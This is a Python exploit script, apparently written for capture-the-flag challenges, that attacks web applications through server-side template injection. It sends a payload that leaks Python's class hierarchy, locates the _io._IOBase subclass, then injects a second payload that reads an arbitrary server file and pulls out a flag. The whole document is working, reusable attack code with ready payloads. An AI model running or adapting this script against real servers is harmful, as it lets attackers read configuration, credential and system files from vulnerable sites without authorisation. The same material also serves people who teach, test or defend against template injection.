#!/usr/bin/env python3
# Author: @TheFlash2k

'''
My generic SSTI file reading script.
Utilizing _io.IOBase.read() to read the file.
'''

import requests
import re
from urllib.parse import quote

''' Modify these values '''
url = "http://localhost:8000"
FILE_TO_READ = "/flag.txt"
endpoint = "/"
param = None

def my_own(resp: str):
    ''' You can write your own parsing logic here. You will get the output of the last request '''
    flag = re.findall(r"(PCC.*?})", resp)[0]
    print(f"FLAG: {flag}")

''' Actual payloads utilized '''
payload_finder = "{{'TheFlash2k'.__class__.__base__.__subclasses__()}}"
payload_read = "{{'abc'.__class__.__base__.__subclasses__()[[INDEX]].__subclasses__()[0].__subclasses__()[0]('[FILE]').read()}}"

def parse(resp: str) -> int:
    '''
    Parse the response for the flag.
    Finds: [<class 'type'>
    Splits the string from this index, upto: >], which is the end of the leaked list:

    Returns:
        Index of _io.IOBase [int]
    '''

    # Manually decoding the HTML entities
    entities = {
        "&lt;": "<",
        "&gt;": ">",
        "&#39;": "'",
        "&quot;": '"',
        "&amp;": "&"
    }

    for entity in entities:
        resp = resp.replace(entity, entities[entity])

    beginning = "[<class 'type'>"
    ending    = ">]"

    index_beg = resp.find(beginning)
    index_end = resp.find(ending)

    if index_beg == -1:
        print("Couldn't find the beginning index.")
        return -1
    if index_end == -1:
        print("Couldn't find the ending index.")
        return -1
    
    resp = resp[index_beg+1:index_end] + ">"
    data = resp.split(",")

    for i in range(len(data)):
        if "_io._IOBase" in data[i]:
            return i
    return -1

def find_iobase(url: str, endpoint: str = "/", param: str = None) -> int:
    '''Returns the index of the _io.IOBase class in the subclasses list.'''

    endpoint = f"{endpoint}[PARAM]{payload_finder}"
    endpoint = endpoint.replace("[PARAM]", f"?{param}=" if param else "")

    url = f"{url}{endpoint}"

    r = requests.get(url)
    return parse(r.text)

def read_file(url: str, io_base_idx: int, file_name: str, endpoint: str = "/", param: str = None):
    '''Reads the file using the _io.IOBase.read() method.'''

    endpoint = f"{endpoint}[PARAM]{payload_read}"
    endpoint = endpoint.replace("[PARAM]", f"?{param}=" if param else "")

    url = f"{url}{endpoint}"
    url = url.replace("[INDEX]", str(io_base_idx))
    url = url.replace("[FILE]", quote(file_name))

    return requests.get(url).text

if __name__ == "__main__":

    idx = find_iobase(url=url, endpoint="/", param=param)
    if idx == -1:
        print("Couldn't find the _io.IOBase class.")
        exit(1)

    print(f"[*] Found _io._IOBase at: {idx}")
    resp = read_file(url=url, io_base_idx=idx, file_name=FILE_TO_READ, endpoint=endpoint, param=param)
    my_own(resp)
